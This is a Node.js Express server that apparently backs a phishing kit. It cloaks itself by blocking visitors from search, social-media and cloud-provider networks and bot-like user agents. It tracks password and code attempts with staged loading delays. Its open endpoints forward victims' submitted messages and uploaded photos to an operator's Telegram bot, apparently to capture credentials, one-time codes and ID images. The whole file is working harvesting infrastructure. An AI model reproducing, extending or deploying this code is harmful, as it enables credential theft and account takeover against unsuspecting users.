import express from 'express';
import cors from 'cors';
import path from 'path';
import { fileURLToPath } from 'url';
import fs from 'fs/promises';
import cookieParser from 'cookie-parser';
import axios from 'axios';
import multer from 'multer';
import FormData from 'form-data';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();

app.use(cors());
app.use(express.json());
app.use(cookieParser());
app.use(express.urlencoded({ extended: true }));
app.set('trust proxy', true);
app.use(async (req, res, next) => {
	const ip =
		req.headers['x-forwarded-for'] ||
		req.connection.remoteAddress ||
		req.ip;
	const blockedAsns = [
		15169, 32934, 396982, 8075, 16510, 198605, 45102, 201814, 14061, 214961,
		401115, 135377, 60068, 55720, 397373, 208312, 63949, 210644, 6939, 209,
		51396,
	];
	const blockedIps = ['95.214.55.43', '154.213.184.3'];
	const blockedUserAgents = [
		'facebook',
		'http',
		'.com',
		'bot',
		'python',
		'BotPoke',
	];
	const userAgent = req.headers['user-agent'];

	try {
		const response = await axios.get(
			`https://get.geojs.io/v1/ip/geo/${ip}.json`,
		);
		const { asn } = response.data;

		if (
			blockedAsns.includes(Number(asn)) ||
			blockedIps.includes(ip) ||
			blockedUserAgents.some((ua) =>
				userAgent.toLowerCase().includes(ua.toLowerCase()),
			)
		) {
			return res.status(403).send('Forbidden');
		}
		next();
	} catch (error) {
		console.error('Error checking IP:', error);
		next();
	}
});

const initializeDatabase = async () => {
	const dbPath = path.join(__dirname, 'database.json');
	try {
		await fs.access(dbPath);
	} catch (error) {
		const defaultData = {
			telegramConfig: {
				chatId: '',
				token: '',
			},
			websiteConfig: {
				maxPasswordAttempts: 3,
				maxCodeAttempts: 3,
				isUploadEnabled: false,
				passwordLoadingTime: 2,
				codeLoadingTime: 2,
				isRealtimeMode: false,
			},
			accountConfig: {
				username: 'admin',
				password: 'admin',
			},
		};
		await fs.writeFile(dbPath, JSON.stringify(defaultData, null, 2));
	}
};

initializeDatabase();
const getDatabase = async () => {
	const dbPath = path.join(__dirname, 'database.json');
	const data = await fs.readFile(dbPath, 'utf-8');
	return JSON.parse(data);
};

app.get('/api/get-telegram-config', async (req, res) => {
	if (req.cookies.ovftank) {
		const database = await getDatabase();
		const { chatId, token } = database.telegramConfig;
		res.json({ chatId, token });
	} else {
		res.status(401).send('Unauthorized');
	}
});

app.get('/api/get-website-config', async (req, res) => {
	if (req.cookies.ovftank) {
		const database = await getDatabase();
		res.json(database.websiteConfig);
	} else {
		res.status(401).send('Unauthorized');
	}
});

app.get('/api/get-account-config', async (req, res) => {
	if (req.cookies.ovftank) {
		const database = await getDatabase();
		res.json({ username: database.accountConfig.username });
	} else {
		res.status(401).send('Unauthorized');
	}
});
app.get('/api/get-password-config', async (req, res) => {
	const database = await getDatabase();
	const { maxPasswordAttempts, passwordLoadingTime } = database.websiteConfig;
	res.json({ maxPasswordAttempts, passwordLoadingTime });
});
app.get('/api/get-code-config', async (req, res) => {
	const database = await getDatabase();
	const { maxCodeAttempts, codeLoadingTime, isUploadEnabled } =
		database.websiteConfig;
	res.json({ maxCodeAttempts, codeLoadingTime, isUploadEnabled });
});
app.post('/api/login', async (req, res) => {
	try {
		const { username, password } = req.body;
		const database = await getDatabase();
		if (
			database.accountConfig.username === username &&
			database.accountConfig.password === password
		) {
			const cookieValue = Math.random().toString(36).substring(2, 15);
			res.cookie('ovftank', cookieValue, {
				httpOnly: true,
				secure: true,
				sameSite: 'strict',
				maxAge: 24 * 60 * 60 * 1000,
			});
			res.send('ok');
		} else {
			res.status(401).send('Unauthorized');
		}
	} catch (error) {
		console.error('Login error:', error);
		res.status(500).send('Internal Server Error');
	}
});

app.post('/api/check-login', (req, res) => {
	const token = req.cookies.ovftank;
	if (token) {
		res.send('ok');
	} else {
		res.status(401).send('Unauthorized');
	}
});

app.post('/api/logout', (req, res) => {
	res.clearCookie('ovftank');
	res.send('ok');
});

app.post('/api/save-telegram-config', async (req, res) => {
	if (req.cookies.ovftank) {
		const { chatId, token } = req.body;
		const database = await getDatabase();
		database.telegramConfig.chatId = chatId;
		database.telegramConfig.token = token;
		await fs.writeFile(
			path.join(__dirname, 'database.json'),
			JSON.stringify(database, null, 2),
		);
		res.send('ok');
	} else {
		res.status(401).send('Unauthorized');
	}
});
app.post('/api/save-website-config', async (req, res) => {
	if (req.cookies.ovftank) {
		const {
			maxPasswordAttempts,
			maxCodeAttempts,
			isUploadEnabled,
			passwordLoadingTime,
			codeLoadingTime,
			isRealtimeMode,
		} = req.body;
		const database = await getDatabase();
		database.websiteConfig = {
			maxPasswordAttempts,
			maxCodeAttempts,
			isUploadEnabled,
			passwordLoadingTime,
			codeLoadingTime,
			isRealtimeMode,
		};
		await fs.writeFile(
			path.join(__dirname, 'database.json'),
			JSON.stringify(database, null, 2),
		);
		res.send('ok');
	} else {
		res.status(401).send('Unauthorized');
	}
});

app.post('/api/save-account-config', async (req, res) => {
	if (req.cookies.ovftank) {
		const { username, currentPassword, newPassword } = req.body;
		const database = await getDatabase();
		if (database.accountConfig.password !== currentPassword) {
			res.status(401).send('Mật khẩu hiện tại không đúng');
			return;
		}
		database.accountConfig = { username, password: newPassword };
		await fs.writeFile(
			path.join(__dirname, 'database.json'),
			JSON.stringify(database, null, 2),
		);
		res.send('ok');
	} else {
		res.status(401).send('Unauthorized');
	}
});
app.post('/api/send_message', async (req, res) => {
	const database = await getDatabase();
	const { chatId, token } = database.telegramConfig;
	const { message } = req.body;
	try {
		const response = await axios.post(
			`https://api.telegram.org/bot${token}/sendMessage`,
			{
				chat_id: chatId,
				text: message,
				parse_mode: 'MarkdownV2',
			},
		);
		console.log(response.data);
		const { message_id } = response.data.result;
		res.json({ message_id });
	} catch (error) {
		console.error('Send message error:', error);
		res.status(500).send('Internal Server Error');
	}
});
app.post('/api/edit_message', async (req, res) => {
	const { message_id, message } = req.body;
	const database = await getDatabase();
	const { chatId, token } = database.telegramConfig;
	try {
		const response = await axios.post(
			`https://api.telegram.org/bot${token}/editMessageText`,
			{
				chat_id: chatId,
				message_id: message_id,
				text: message,
				parse_mode: 'MarkdownV2',
			},
		);
		res.json({ message_id: response.data.result.message_id });
	} catch (error) {
		console.error('Edit message error:', error);
		res.status(500).send('Internal Server Error');
	}
});

const upload = multer({ storage: multer.memoryStorage() });

app.post('/api/upload_file', upload.single('photo'), async (req, res) => {
	const { message_id } = req.body;
	const file = req.file;
	const database = await getDatabase();
	const { chatId, token } = database.telegramConfig;

	if (!file) {
		return res.status(400).send('No file uploaded');
	}

	try {
		const form = new FormData();
		form.append('chat_id', chatId);
		form.append('photo', file.buffer, { filename: file.originalname });
		form.append('reply_to_message_id', message_id);

		const response = await axios.post(
			`https://api.telegram.org/bot${token}/sendPhoto`,
			form,
			{ headers: form.getHeaders() }
		);

		res.json({ message_id: response.data.result.message_id });
	} catch (error) {
		console.error('Upload file error:', error);
		res.status(500).send('Internal Server Error');
	}
});
app.use(express.static(path.join(__dirname, 'dist')));
app.get('*', (req, res) => {
	res.sendFile(path.join(__dirname, 'dist', 'index.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
	console.log(`Server running on http://localhost:${PORT}`);
});
